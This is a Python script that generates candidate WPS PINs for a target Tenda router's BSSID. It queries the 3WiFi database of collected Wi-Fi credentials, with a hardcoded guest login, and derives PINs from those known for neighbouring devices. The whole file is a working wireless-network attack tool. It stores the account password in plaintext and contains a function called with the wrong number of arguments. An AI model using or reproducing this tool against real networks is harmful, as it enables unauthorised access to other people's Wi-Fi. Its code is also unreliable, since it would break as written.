# -*- coding: utf-8 -*-
try:
    import requests
except ImportError:
    print('''The script needs Requests module\n
Please install with:\npip3 install requests\nor\n
pip install requests
''')
    exit(1)
import argparse
try:
	import WPSpin
except ImportError:
	print('''The script needs WPSpin.py module\n
Make sure the WPSpin.py file is in the current directory''')
	exit(1)
from collections import OrderedDict
import time

# Distance table
# BSSID Distance: PIN distances
distances_table = {
    8: [109481, 195528, 195529, 195784, 195785, 196040, 196041, 199310, 251569, 261064, 261065, 261320, 261321, 261576, 261577, 326051, 326600, 326857, 342251, 603760, 744416, 1181172, 3037371, 3299053, 3836421, 4564992, 4569774, 5281265],
    16: [391056, 391057, 391312, 391313, 391568, 391569, 456592, 456593, 456848, 456849, 457104, 457105, 48119, 186356, 195528, 195529, 195784, 196041, 244846, 251636, 261064, 261320, 261321, 261576, 522384, 522385, 522640, 856221, 1104633, 1137080, 1209680, 1442237, 1442493, 1496741, 3080583, 5477050, 8685733],
    24: [586840, 586841, 587096, 587097, 587352, 587353, 596591, 652376, 652377, 652632, 652633, 652888, 652889, 661593, 717912, 717913, 718168, 718169, 718425, 799099, 1198303, 1638277, 1703557, 2162801, 3341903, 5017217, 5672578, 5886069, 7679505],
    32: [847904, 847905, 848160, 848161, 848416, 848417, 913441, 913696, 913697, 913952, 913953, 929090, 1833549, 1899341, 2209906, 2622086, 2886150, 3548321, 4151875, 4488797, 5868362],
    40: [43944, 43945, 44201, 58556, 109480, 109481, 109737, 109993, 175017, 175273, 897222, 1043944, 1043945, 1044200, 1044201, 1109480, 1109481, 1109736, 1109737, 1175016, 1175017, 1336381, 1666529, 2094870, 3530979, 4266729, 5413153, 6129682],
    48: [1239473, 1239729, 1239730, 1239985, 1305009, 1305010, 1305265, 1305521, 1370545, 1370801, 1371057, 1952794, 2593205, 3064204, 3889696, 4667470, 4945902, 6101649, 6325210, 239473, 239729, 239985, 254341, 305009, 305265, 305521, 370545, 370801, 371057, 587097, 587352, 652376, 652377, 652632, 652633, 652889, 1093263, 1117039, 1158799]
}
max_bssid_distance = max(distances_table)


class AuthError(Exception):
    pass


class InputDataError(Exception):
    pass


class Api:
    def __init__(self, login, password):
        self.s = requests.Session()
        self.__auth(login, password)

    def __auth(self, login, password):
        a = self.s.post('https://3wifi.stascorp.com/user.php?a=login',
                        data={'login': login, 'password': password})
        response = a.json()
        if response['result']:
            self.login = login
            self.password = password
        else:
            raise AuthError(response['error'])

    def __reAuth(self):
        self.__auth(self.login, self.password)

    def __baseRequest(self, action, params):
        try:
            result = self.s.post(
                'https://3wifi.stascorp.com/3wifi.php?a={}'.format(action),
                data=params,
                timeout=300
                ).json()
        except requests.exceptions.ConnectionError:
            return self.__baseRequest(action, params)
        if 'auth' in result and not result['auth']:
            self.__reAuth()
            return self.__baseRequest(action, params)
        if result['result'] is False:
            if result['error'] == 'cooldown':
                print('[*] 3WiFi guest account cooldown received, please wait 10 seconds...')
                time.sleep(10)
                return self.__baseRequest(action, params)
            else:
                raise InputDataError(result['error'])
        return result

    def find(self, bssid=None, essid=None, key=None,
             pin=None, sensitivity=False, limit=1):
        if bssid is None:
            bssid = ''
        data = {'essid': essid, 'key': key, 'wps': pin}
        new_data = {'bssid': bssid}
        for i, j in data.items():
            if j is None:
                new_data[i] = '◯'
            else:
                new_data[i] = j

        if sensitivity:
            new_data['sens'] = 'on'

        result = self.__baseRequest('find', new_data)
        data = result['data']
        pages_count = result['page']['count']
        page = 1
        if not limit:
            while page < pages_count:
                page += 1
                new_data['page'] = page
                result = self.__baseRequest('find', new_data)
                data += result['data']
        else:
            if limit > pages_count:
                limit = pages_count
            while page < limit:
                page += 1
                new_data['page'] = page
                result = self.__baseRequest('find', new_data)
                data += result['data']
        return data


def containsAlgo(t_mac, wps_pin):
    '''Checks if a WPS PIN is generated according to a known algorithm'''
    common_static = ['00000000', '12345670', '12345678']
    tenda_static = ['03436080', '03436165', '03974247', '06966409', '09278325', '19967899', '25086164', '25563818', '25777390', '27334737', '35806691', '45304347', '50542208', '63410372', '63491838', '71294988', '74250226']
    if (wps_pin in common_static) or (wps_pin in tenda_static):
        return 'Static PIN: {}'.format(wps_pin)
    mac_list = [t_mac, decIncMAC(t_mac, -1), decIncMAC(t_mac, +1)]
    for mac in mac_list:
        wpsPins = pinGen.getAll(mac=mac, get_static=False)
        for item in wpsPins:
            if item['pin'] == wps_pin:
                return item['name']
    return False


def subBSSID(bssid1, bssid2):
    '''Subsbtract the last byte of BSSID1 from BSSID2'''
    bssid1 = [int(i, 16) for i in bssid1.split(':')]
    bssid2 = [int(i, 16) for i in bssid2.split(':')]
    res = bssid2[-1] - bssid1[-1]
    return res


def createParser():
    parser = argparse.ArgumentParser(
        description='''Experimental online PIN code generator
        for some Tenda devices.
        Uses 3WiFi Wireless Database to get data.'''
        )
    parser.add_argument(
        'bssid',
        nargs='?',
        type=str,
        help='the target BSSID'
        )
    parser.add_argument(
        '-i',
        '--ignore-pin',
        action='store_const',
        const=True,
        help='ignore if pin to BSSID is found in 3WiFi'
        )
    parser.add_argument(
        '-d',
        '--search-depth',
        type=int,
        default=1,
        help='the number of BSSID\'s used for the search PINs \
        (set 0 for unlimited). Default: 1'
        )

    return parser


if __name__ == '__main__':
    parser = createParser()
    namespace = parser.parse_args()

    try:
        with open('account.txt', 'r', encoding='utf-8') as file:
            login, password = file.read().strip().split(':')
    except FileNotFoundError:
        login = input('Input a username for 3WiFi\
                         (just press Enter to use guest account): ')
        if login:
            password = input('Input a password for 3WiFi: ')
        else:
            login, password = 'antichat', 'antichat'
        try:
            session = Api(login, password)
        except AuthError:
            print('[-] Authorization failed. Check username and password.')
            exit(1)
        else:
            with open('account.txt', 'w', encoding='utf-8') as file:
                file.write('{}:{}'.format(login, password))
    else:
        try:
            session = Api(login, password)
        except AuthError:
            print('[-] Authorization failed. Check username and password.')
            exit(1)
    print('[+] Authentication is successful')

    if namespace.bssid:
        source_bssid = namespace.bssid
    else:
        source_bssid = input('Please specify the BSSID: ')

    a = ':'.join(source_bssid.split(':')[:-1]) + '*'
    res = session.find(bssid=a, pin='□□□□□□□□')
    if not res:
        print('[-] Not found similar BSSID\'s in the 3WiFi')
        exit(1)
    print('[+] Found {} similar BSSID\'s'.format(len(res)))

    # Filtering and processing 3WiFi data
    pinGen = WPSpin.WPSpin()
    data = {}
    for item in res:
        bssid = item['bssid']
        pin = item['wps']
        if (not namespace.ignore_pin) and (bssid == source_bssid):
            print('The PIN for {} was found in 3WiFi: {}'.format(
                source_bssid, pin)
            )
            exit(0)
        if not containsAlgo(bssid, pin, pinGen) and (bssid not in data):
            data[bssid] = int(pin[:-1])

    # Dictionary of distance as key and BSSID/PIN as value
    distances = {}

    # Calculating all distances
    for bssid, pin in data.items():
        distance = subBSSID(source_bssid, bssid)
        if (distance != 0) and (distance not in distances) \
                and (abs(distance) <= max_bssid_distance):
            distances[distance] = {'bssid': bssid, 'pin': pin}

    # Sorting distances as absolutely values
    if distances:
        distances = OrderedDict(
            sorted(distances.items(), key=lambda x: abs(x[0]))
            )
    else:
        print('[-] Not found nearby BSSID\'s')

    pins = OrderedDict()
    depth_limit = 0
    for dist, value in distances.items():
        bssid = value['bssid']
        pin = value['pin']
        temp_pins = []
        for d in distances_table[abs(dist)]:
            if dist > 0:
                rest_pin = pin - d
            else:
                rest_pin = pin + d
            if (rest_pin > 9999999) or (rest_pin < 0):
                continue
            rest_pin = (str(rest_pin) + str(pinGen.checksum(rest_pin))).zfill(8)
            temp_pins.append(rest_pin)
        pins[bssid] = {'pins': temp_pins, 'distance': dist}
        if namespace.search_depth != 0:
            depth_limit += 1
            if depth_limit == namespace.search_depth:
                break

    for bssid, value in pins.items():
        pin_list = value['pins']
        distance = value['distance']
        print('\nPINs generated with {} (distance: {}; count: {}):'.format(
            bssid, distance, len(pin_list)))
        counter = 1
        for pin in pin_list:
            # Pretty printing
            space = ' ' * (3-len(str(counter)))
            print('{}){}{}'.format(counter, space, pin))
            counter += 1
